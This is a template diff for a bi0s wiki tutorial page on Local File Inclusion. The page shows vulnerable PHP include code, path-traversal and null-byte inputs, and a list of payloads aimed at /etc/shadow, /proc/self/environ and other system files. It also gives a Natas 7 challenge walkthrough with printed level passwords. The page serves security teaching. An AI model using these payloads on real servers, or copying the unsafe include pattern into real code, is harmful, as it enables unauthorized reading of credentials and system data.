@@ -1,0 +1,171 @@
+{% extends "bi0s_main.html" %}
+{% block title %}
+<title>Local File Inclusion - bi0s wiki</title>
+{% endblock %}
+{% block content %}
+{% load static %}
+<div class="md-sidebar md-sidebar--secondary" data-md-component="toc" style="height: 527px;">
+<div class="md-sidebar__scrollwrap">
+<div class="md-sidebar__inner">
+<nav class="md-nav md-nav--secondary">
+<label class="md-nav__title" for="__toc">Table of contents</label>
+<ul class="md-nav__list" data-md-scrollfix="">
+<li class="md-nav__item">
+<a href="#impact" title="Impact" class="md-nav__link">
+Impact
+</a>
+<nav class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a href="#local-file-inclusion-in-php" title="Local file inclusion in PHP:" class="md-nav__link">
+Local file inclusion in PHP:
+</a>
+</li>
+</ul>
+</nav>
+</li>
+<li class="md-nav__item">
+<a href="#explore-it-yourself" title="Explore it yourself" class="md-nav__link">
+Explore it yourself
+</a>
+<nav class="md-nav">
+<ul class="md-nav__list">
+<li class="md-nav__item">
+<a href="#somepayloads" title="Somepayloads :" class="md-nav__link">
+Somepayloads :
+</a>
+</li>
+</ul>
+</nav>
+</li>
+</ul>
+</nav>
+</div>
+</div>
+</div>
+<div class="md-content">
+<article class="md-content__inner md-typeset">
+<a href="https://gitlab.com/teambi0s/bi0s-wiki/blob/master/docs/web/lfi.md" title="Edit this page" class="md-icon md-content__icon"></a><img name="kl_1567872487624" style="width: 12px; height: 12px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAACXBIWXMAAAsSAAALEgHS3X78AAAB3ElEQVQ4jY2TPWhTURTH/+e8l7QNJg0qCJpCSdEnONTFDk5udfILs9mS6iJYpI4VnURXUcRJrFG3gm3tXLpIxaUUIVA/iLRJayQ2Nk1q7cu99zjUF/JhQv7jOff/O+fcwyERAQAQEaoVjsdOirgP93L+W5svJpeq8xVfPWD/yPkepekBWbjETl8nM0h9XtkRV72xLbmdn5hJ/xdw4OaVkC6U7oBwg6MRH0d7fGTbQDoLIYKUXa2/rO5C6SdWOHh/4/HrLQCwvZZUoZi2Dh/ysdPbRZ0dNeOQCMj2WXTiaMCUtsdUKn0dQHcNAEZCVr+DViJjYAW6/NqI34txS0eVIqEwRgfONMTbApyORDE3PIbF9dX2AKPHTyESCFbMExeGMTL9EguZVHuAxY3vmBscwtkjfS3NTQELuQzi72bwaGAQ8elEUzNQtQUiLsmf3X3eCt/n1uBMPQUy2bqSDCIuNXQgjHnJ5kzTUt47rUQY8w0AG2ZcLX/bkc2t5m5mlJdTv22Y8QZAPjGbBPHl8oePRb2yruu9BjBu8msRGrF8YjZZGb3+mA5ePee4ip9xoKOfj/UGSRuYtR/b+ldxyW/paz+fv/0EtLhGT91DF2NgubtXnu4VXk1N1vzFP99f037PUFbu4yIAAAAASUVORK5CYII=" width="12" height="12">
+<h1 id="local-file-inclusion">Local File Inclusion<a class="headerlink" href="#local-file-inclusion" title="Permanent link">¶</a></h1>
+<blockquote>
+<p>Local File Inclusion (also known as LFI) allows an attacker to 
+include files in server-side through the web browser. File inclusions 
+are part of every advanced server-side scripting language on the web.LFI
+ is commonly found to affect web applications that rely on a scripting 
+runtime. This occurs mainly due to a bad input validation mechanism, 
+wherein the user’s input is passed to the file include commands without 
+proper validation.</p>
+</blockquote>
+<h2 id="impact">Impact<a class="headerlink" href="#impact" title="Permanent link">¶</a></h2>
+<p>A successful LFI may result in compromise of the system, data leakage
+ etc. The attacker can read, write, download files and can also run 
+arbitrary codes with privileges of the web server.</p>
+<h3 id="local-file-inclusion-in-php">Local file inclusion in PHP:<a class="headerlink" href="#local-file-inclusion-in-php" title="Permanent link">¶</a></h3>
+<p>Consider an example as follows where we can apply this attack.
+http://victim_site/abc.php?file=userinput.txt
+The value of “file” parameter is taken into the following PHP code, and the file is included:
+</p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3
+4
+5
+6
+7</pre></div></td><td class="code"><div class="codehilite" id="__code_0"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_0 pre, #__code_0 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="cp">&lt;?php</span>
+   <span class="nv">$file</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
+   <span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$file</span><span class="p">))</span>
+   <span class="p">{</span>
+       <span class="k">include</span><span class="p">(</span><span class="s2">"pages/</span><span class="si">$file</span><span class="s2">"</span><span class="p">);</span>
+   <span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+</td></tr></tbody></table>
+An attacker may give malicious input for the "file" parameter which may 
+give unauthorized files in that directory, he can also change the 
+directories by using characters like "../".He can access the user 
+credentials by giving input as "../../../../etc/passwd".In some cases 
+where the file extension is added by default, we can avoid it by adding <strong><em>null byte terminator</em></strong> " %00".Any character after this special character will be ignored.<p></p>
+<p>Suppose that the input given is taken by the following code and the default extension being set is “.php”.
+</p><table class="codehilitetable"><tbody><tr><td class="linenos"><div class="linenodiv"><pre><span></span>1
+2
+3</pre></div></td><td class="code"><div class="codehilite" id="__code_1"><button class="md-clipboard" title="Copy to clipboard" data-clipboard-target="#__code_1 pre, #__code_1 code"><span class="md-clipboard__message"></span></button><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nx">“include</span><span class="o">/</span><span class="nx">”</span><span class="o">.</span><span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">‘testfile’</span><span class="p">]</span><span class="o">.</span><span class="nx">”</span><span class="o">.</span><span class="nx">php”</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+</td></tr></tbody></table><p></p>
+<p>by giving file=../../../../etc/passwd%00 we can access the file by passing the ".php" extension.</p>
+<p>An attacker can also download files by changing the file names. For example
+<br>URL: example/?download=broucher.pdf
+<br>The attacker may change the broucher.pdf to any other file such as passwords.txt,users.txt etc.</p>
+<h2 id="explore-it-yourself">Explore it yourself<a class="headerlink" href="#explore-it-yourself" title="Permanent link">¶</a></h2>
+<p>Make a PHP file with the code given above and explore different possibilities of the vulnerability.</p>
+<h3 id="somepayloads">Somepayloads :<a class="headerlink" href="#somepayloads" title="Permanent link">¶</a></h3>
+<ul>
+<li>../../../../etc/passwd/etc/issue</li>
+<li>../../../../etc/passwd</li>
+<li>../../../../etc/passwd/etc/shadow</li>
+<li>../../../../etc/passwd/etc/group</li>
+<li>../../../../etc/passwd/etc/hosts</li>
+<li>../../../../etc/passwd/etc/motd</li>
+<li>../../../../etc/passwd/etc/mysql/my.cnf</li>
+<li>../../../../proc/self/environ</li>
+<li>../../../../proc/version</li>
+<li>../../../../proc/cmdline</li>
+<li>../../../../proc/sched_debug</li>
+<li>../../../../proc/mounts</li>
+<li>../../../../proc/net/arp</li>
+<li>../../../../proc/net/route</li>
+<li>../../../../proc/net/tcp</li>
+<li>../../../../proc/net/udp</li>
+</ul>
+<h1 id="lets-try-a-challenge">Let's try a challenge<a class="headerlink" href="#lets-try-a-challenge" title="Permanent link">¶</a></h1>
+<p>NATAS 7 :
+- USERNAME : natas7
+- PASSWORD : 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
+<img alt="natas7" src="{% static "bi0s_wiki/natas7_004.png" %}"></p>
+<p>The site is very simple only with two buttons, but once when you click on Home or About the URL changes as follows :</p>
+<p><img alt="natas7" src="{% static "bi0s_wiki/natas7_005.png" %}"><br>
+<img alt="natas7" src="{% static "bi0s_wiki/natas7_002.png" %}"></p>
+<p>It looks like the PHP file is including the file given as page, when we check the source code we get the hint as<br>
+hint: password for webuser natas8 is in /etc/natas_webpass/<br><br>
+<img alt="natas7" src="{% static "bi0s_wiki/natas7.png" %}"></p>
+<p>So, let's try to include that file in the URL
+URL : index.php?page=/etc/natas_webpass/natas8
+On including this file we get the password for the next level on the screen <br><br>
+password : DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe<br><br>
+<img alt="natas7" src="{% static "bi0s_wiki/natas7_003.png" %}">
+<br><br>
+This is a basic example of Local file inclusion vulnerability.</p>
+</article>
+</div>
+</div>
+</main>
+<footer class="md-footer">
+<div class="md-footer-nav">
+<nav class="md-footer-nav__inner md-grid">
+<a href="/help/bi0s_wiki/web/file-upload/" title="File upload vulnerability" class="md-flex md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+<div class="md-flex__cell md-flex__cell--shrink">
+</div>
+<div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+<span class="md-flex__ellipsis">
+<span class="md-footer-nav__direction">
+Previous
+</span>
+File upload vulnerability
+</span>
+</div>
+</a>
+<a href="/help/bi0s_wiki/web/sql/" title="SQL Injection" class="md-flex md-footer-nav__link md-footer-nav__link--next" rel="next">
+<div class="md-flex__cell md-flex__cell--stretch md-footer-nav__title">
+<span class="md-flex__ellipsis">
+<span class="md-footer-nav__direction">
+Next
+</span>
+SQL Injection
+</span>
+</div>
+<div class="md-flex__cell md-flex__cell--shrink">
+</div>
+</a>
+</nav>
+</div>
+{% endblock %}
